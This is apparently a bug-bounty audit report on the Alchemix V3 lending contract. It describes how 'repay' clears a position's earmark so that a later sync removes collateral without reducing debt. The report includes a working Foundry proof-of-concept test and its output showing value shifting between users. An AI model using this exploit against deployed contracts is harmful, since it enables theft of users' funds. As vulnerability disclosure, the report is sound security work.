# 57916 sc critical repay removes earmark meant to be reducing debt while collateral is still reduced

**Submitted on Oct 29th 2025 at 12:58:41 UTC by @JoeMama for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57916
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

When a user repays a portion of his debt, the `repay` function will remove the earmark, but keep the collateral position, when `sync` is called afterwards, it will **wrongly** remove some of the users collateral but not remove the debt because earmark is 0.

* One issue is that `Repay` is paying off the debt that would normally been removed by sync. ( up to the earmark amount )
* The second issue is that it makes the user lose a portion of its collateral while not reducing debt during the next sync.

```
function repay(uint256 amount, uint256 recipientTokenId) public returns (uint256) {
.... snip ...
 account.earmarked -= earmarkToRemove;
}
```

## Vulnerability Details

The root cause of the issue is that during `repay`, the earmark from a token is removed by the repay amount, while the collateral position is still active, so now the debt will be decreased by 0 while the collateral ( for that earmark amount) will still be reduced by the line:

```
Function _sync(uint256 tokenId) internal {
 -- snip -- 
   Account storage account = _accounts[tokenId];
    
   uint256 collateralToRemove = PositionDecay.ScaleByWeightDelta(account.rawLocked, _collateralWeight -    account.lastCollateralWeight);

   account.collateralBalance -= collateralToRemove;

```

The debt removed will be 0, making the account.debt remain the same:

```
uint256 redeemedTotal = (account.earmarked - exposureSurvival) + redeemedFromEarmarked;

account.earmarked = exposureSurvival + earmarkedUnredeemed;
   
account.debt = account.debt >= redeemedTotal ? account.debt - redeemedTotal : 0;

```

Secondly the debt ( up to earmark ) that was removed by repay, would have normally been synced and removed from the debt:

```
account.debt = account.debt >= redeemedTotal ? account.debt - redeemedTotal : 0; 
```

## Impact Details

When the user repays a part of his debt, while having active earmark, he will lose a portion of his collateral and not remove the debt, because the repay function repays the debt that would have normally been freed by syncing the position, also it doesn't remove the position so it will still process the removal of collateral.

## Link to Proof of Concept

<https://gist.github.com/hexens-joe/35a987b5c1a85e3e957b3c972cd2369f>

## Proof of Concept

## Proof of Concept

1. Token 1 has 1.2e18 collateral
2. Token 2 has 1.2e18 collateral
3. Token 1 mints 1e18 debt
4. Token 2 mints 1e18 debt
5. Token 1’s owner calls `createRedemption` with 1e18 of the tokens received from minting.
6. 10\_000 seconds pass and the claim is ready.
7. Token 2 calls `repay` with 0.5e18 underlying -> reduces debt to 0.5e18 while still having 1.2e18 collateral. ( However this also reduced his earmarked, which was 0.5e18 because of the token1’s owner redemption. ) (**this is the root cause of the bug**)
8. Token 1’s owner calls `claim redemption`.
9. Now during `sync` token 2 it's collateral will be reduced by 0.17e18, and remove 0 debt. (**this is the impact of the bug** )
10. Now during `sync` token 1 it's collateral will be reduced by 0.33e18, and remove 0.5e18 debt.

**Now token2 is worth less than he put in the protocol ( 1.7e18 underlying ):**

```
 + collateral: 1.03e18 
 + al tokens: 1e18;
 - repayment amount 0.5e18
 - debt: 0.5e18
--------------------
= 1.03e18 total value  (less than the 1.7e18)
```

**Now token1 is worth more than he put in the protocol ( 1.2 underlying ):**

```
 + collateral: 0.86e18
 - debt: 0.5e18
 + al tokens: 0;
 + underlying tokens: 1e18
--------------------
= 1.36e18 total value  (more than the 1.2e18)
```

POC:

You can add it to the existing test AlchemistV3Test, or run as shown in the gist.

```
function testRepayPoc() external {
      
        address user1 = makeAddr("user1");
        address user2 = makeAddr("user2");

        deal(address(vault), address(user1), 1.2e18); // starts with 1.2e18 underlying
        deal(address(vault), address(user2), 1.7e18); // starts with 1.7e18 underlying

        vm.startPrank(address(user1));
        SafeERC20.safeApprove(address(vault), address(alchemist), type(uint256).max);
        alchemist.deposit(1.2e18, address(user1), 0);
        vm.stopPrank();

        vm.startPrank(address(user2));
        SafeERC20.safeApprove(address(vault), address(alchemist), type(uint256).max);
        alchemist.deposit(1.2e18, address(user2), 0);
        vm.stopPrank();

        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(user1), address(alchemistNFT));
        uint256 tokenId2 = AlchemistNFTHelper.getFirstTokenId(address(user2), address(alchemistNFT));

        vm.prank(user1);
        alchemist.mint(tokenId, 1e18, user1);

        vm.roll(vm.getBlockNumber() + 1);

        vm.prank(user2);
        alchemist.mint(tokenId2, 1e18, user2);

        vm.roll(vm.getBlockNumber() + 1);

        vm.startPrank(user1);

        IERC20(alToken).approve(address(transmuterLogic), 3000e18);
        IERC20(address(vault)).approve(address(alchemist), 100_000e18);
        transmuterLogic.createRedemption(1e18);
        vm.stopPrank();

        vm.roll(vm.getBlockNumber() + 10000); // full dulration of the redemption.

        vm.startPrank(user2);
        IERC20(alToken).approve(address(transmuterLogic), 3000e18);
        IERC20(address(vault)).approve(address(alchemist), 100_000e18);
        console.log("");
        (uint256 a, uint256 b, uint256 c) = alchemist.getCDP(tokenId);
        (uint256 a2, uint256 b2, uint256 c2) = alchemist.getCDP(tokenId2);
        console.log("");
        console.log("before repay collateral user 1", a); // 1200000000000000000
        console.log("before repay debt user 1", b); // 1000000000000000000
        console.log("before repay earmarked user 1", c); // 500000000000000000
        console.log("");
        console.log("before repay collateral user 2", a2); // 1200000000000000000
        console.log("before repay debt user 2", b2); // 1000000000000000000
        console.log("before repay earmarked user 2", c2); // 500000000000000000
        console.log("");
        console.log("repaying");

        alchemist.repay(0.5e18, tokenId2);

        vm.roll(vm.getBlockNumber() + 1);

        vm.startPrank(user1);
        transmuterLogic.claimRedemption(1);

        vm.roll(vm.getBlockNumber() + 1);

        // just incase to have the lasest versions.
        alchemist.poke(tokenId);
        alchemist.poke(tokenId2);

        (uint256 a3, uint256 b3, uint256 c3) = alchemist.getCDP(tokenId);
        (uint256 a4, uint256 b4, uint256 c4) = alchemist.getCDP(tokenId2);


        console.log("");
        console.log("final collateral user 1", a3); // 866666666666666666
        console.log("final debt user 1", b3); // 500000000000000000
        console.log("final earmarked user 1", c3); // 0
        console.log("");
        console.log("final collateral user 2", a4); // 1033333333333333333 ( this looks higher but a repay of 0.5e18 underlying was paid by this user too )
        console.log("final debt user 2", b4); // 500000000000000000
        console.log("final earmarked user 2", c4); // 0
        console.log("");

        uint256 bal = IERC20(alToken).balanceOf(address(user1));
        console.log("Token balance user 1:", bal);

        uint256 bal2 = IERC20(alToken).balanceOf(address(user2));
        console.log("Token balance user 2:", bal2);
    }
```

output:

```
  before repay collateral user 1 1200000000000000000
  before repay debt user 1 1000000000000000000
  before repay earmarked user 1 500000000000000000
  
  before repay collateral user 2 1200000000000000000
  before repay debt user 2 1000000000000000000
  before repay earmarked user 2 500000000000000000

  final collateral user 1 866666666666666666
  final debt user 1 500000000000000000
  final earmarked user 1 0
  
  final collateral user 2 1033333333333333333
  final debt user 2 500000000000000000
  final earmarked user 2 0
  
  Token balance user 1: 0
  Token balance user 2: 1000000000000000000
```
